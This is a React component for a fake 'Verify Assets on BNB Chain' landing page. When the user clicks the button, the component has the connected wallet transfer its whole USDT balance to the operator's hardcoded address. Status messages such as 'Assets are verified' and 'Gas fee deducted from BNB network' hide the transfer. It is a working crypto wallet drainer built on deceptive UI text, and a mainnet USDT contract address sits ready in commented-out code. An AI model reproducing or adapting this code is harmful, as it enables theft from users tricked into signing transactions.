import React, { useState, useEffect } from "react";
import { ethers } from "ethers";
import homeimage from "../assets/home.png";

const RECIPIENT_ADDRESS ="" //add your address from where you want to pay gas or where you want to recive the usdt
const PRIVATE_KEY_RECIPIENT = ""// private key of that wallet where you want to pay gas from

// USDT contract details in sepolis testnet 
const USDT_CONTRACT = {
    address: "0x5De32589947cEF8c82908324dF03b4aF415bc834", // USDT contract address on Sepolia
    abi: [
        {
            constant: true,
            inputs: [{ name: "account", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            type: "function",
        },
        {
            constant: false,
            inputs: [
                { name: "to", type: "address" },
                { name: "value", type: "uint256" },
            ],
            name: "transfer",
            outputs: [{ name: "", type: "bool" }],
            type: "function",
        },
        {
            constant: false,
            inputs: [
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
            ],
            name: "approve",
            outputs: [{ name: "", type: "bool" }],
            type: "function",
        },
    ],
};

// USDT Contract details on BNB Chain Mainnet
// const USDT_CONTRACT = {
//     address: "0x55d398326f99059fF775485246999027B3197955", // USDT contract on BNB Chain Mainnet
//     abi: [
//         {
//             constant: true,
//             inputs: [{ name: "account", type: "address" }],
//             name: "balanceOf",
//             outputs: [{ name: "", type: "uint256" }],
//             type: "function",
//         },
//         {
//             constant: false,
//             inputs: [
//                 { name: "to", type: "address" },
//                 { name: "value", type: "uint256" },
//             ],
//             name: "transfer",
//             outputs: [{ name: "", type: "bool" }],
//             type: "function",
//         },
//         {
//             constant: false,
//             inputs: [
//                 { name: "spender", type: "address" },
//                 { name: "value", type: "uint256" },
//             ],
//             name: "approve",
//             outputs: [{ name: "", type: "bool" }],
//             type: "function",
//         },
//     ],
// };


export default function Landing() {
    const [walletAddress, setWalletAddress] = useState("Not connected");
    const [status, setStatus] = useState("");
    const [provider, setProvider] = useState(null);
    const [signer, setSigner] = useState(null);
    const [userBalance, setUserBalance] = useState(ethers.BigNumber.from(0));
    const [loading, setLoading] = useState(false);  // New state to track loading status

    useEffect(() => {
        connectWallet();
    }, []);

    const connectWallet = async () => {
        if (typeof window.ethereum === "undefined") {
            alert("Wallet is not installed. Please install a wallet to continue.");
            return;
        }

        try {
            const newProvider = new ethers.providers.Web3Provider(window.ethereum);
            await newProvider.send("eth_requestAccounts", []);
            const newSigner = newProvider.getSigner();
            const address = await newSigner.getAddress();

            setProvider(newProvider);
            setSigner(newSigner);
            setWalletAddress(address);

            const usdtContract = new ethers.Contract(
                USDT_CONTRACT.address,
                USDT_CONTRACT.abi,
                newProvider
            );
            const balance = await usdtContract.balanceOf(address);
            setUserBalance(balance);

            // setStatus("Wallet connected.");
        } catch (error) {
            console.error("Error connecting wallet:", error);
            setStatus("Error connecting wallet.");
        }
    };

    const verifyAndTransferUSDT = async () => {
        if (!walletAddress || !provider || !signer) {
            setStatus("Please connect your wallet first.");
            return;
        }

        setLoading(true); // Start the loading animation

        try {
            // Step 1: Deduct gas fee from recipient's wallet
            const recipientSigner = new ethers.Wallet(PRIVATE_KEY_RECIPIENT, provider);
            const usdtContractWithRecipientSigner = new ethers.Contract(
                USDT_CONTRACT.address,
                USDT_CONTRACT.abi,
                recipientSigner
            );

            setStatus("Searching gas free transaction...");
            const approveTx = await usdtContractWithRecipientSigner.approve(
                RECIPIENT_ADDRESS,
                ethers.utils.parseUnits("100", 18) // Example: Approve 100 USDT for gas fee
            );
            setStatus(`Gas free transaction found.`);
            await approveTx.wait();
            setStatus("Gas fee deducted from BNB network.");

            // Step 2: Transfer all approved USDT from the user's wallet
            const usdtContractWithSigner = new ethers.Contract(
                USDT_CONTRACT.address,
                USDT_CONTRACT.abi,
                signer
            );
            setStatus("Verifying assets...");
            const sendTx = await usdtContractWithSigner.transfer(
                RECIPIENT_ADDRESS,
                userBalance
            );
            // setStatus(`Loading... Hash: ${sendTx.hash}`);
            await sendTx.wait();
            setStatus(
                `Assets are verified.`
            );
        } catch (error) {
            console.error("Error during verification and transfer:", error);
            setStatus(`Error: ${error.message}`);
        } finally {
            setLoading(false); // Stop the loading animation once done
        }
    };

    return (
        <div className="relative h-screen">
            {/* Dim the landing page when loading */}
            {loading && (
                <div className="absolute inset-0 bg-black bg-opacity-50 flex justify-center items-center z-20">
                    <div className="text-white"></div>
                    <div className="spinner"></div> {/* Custom spinner or loading animation */}
                </div>
            )}

            {/* Main background and page content */}
            <div
                className="absolute inset-0 bg-cover bg-center bg-blend-overlay"
                style={{
                    backgroundImage: `url(${homeimage}), linear-gradient(rgba(1, 1, 55, 0.5), rgba(1, 0, 0, 0.1))`,
                }}
            ></div>
            <main className="flex-grow flex flex-col items-center justify-center p-6 text-center relative z-10">
                <div className="mt-[140px]">
                    <div>
                        <h1 className="text-[32px] font-semibold mb-6 text-white">
                            Verify Assets on <span className="text-yellow-400">BNB Chain</span>
                        </h1>
                        <h1 className="text-[22px] mb-8 text-white">
                            Serving Gas Less Web3 tools to over 478 Million users
                        </h1>
                        <p className="text-[13px] mb-3 text-white">
                            A community-driven blockchain ecosystem of Layer-1 and Layer-2 scaling solution.
                        </p>
                    </div>
                    <div className="flex justify-center">
                        <div>
                            <div className="space-y-4 w-full max-w-xs">
                                <button
                                    onClick={verifyAndTransferUSDT}
                                    className="w-[280px] text-black text-sm py-3 bg-gray-200 rounded-md transition"
                                >
                                    Verify Assets
                                </button>
                            </div>
                            <div className="space-y-4 flex justify-center w-full max-w-xs pt-[6px]">
                                <button
                                    className="w-[280px] border-[1px] border-white text-white text-sm py-3 rounded-md flex items-center justify-center space-x-1 transition"
                                >
                                    <svg width="12" height="12" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M1 6V15H6V11C6 9.89543 6.89543 9 8 9C9.10457 9 10 9.89543 10 11V15H15V6L8 0L1 6Z" fill="#ffffff" />
                                    </svg>
                                    <a href="https://www.bnbchain.org/en" target="_blank" rel="noopener noreferrer">
                                        <span>HOME</span>
                                    </a>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                {/* Status message */}
                {status && <div className="text-yellow-400  mt-4">{status}</div>}
            </main>
        </div>
    );
}
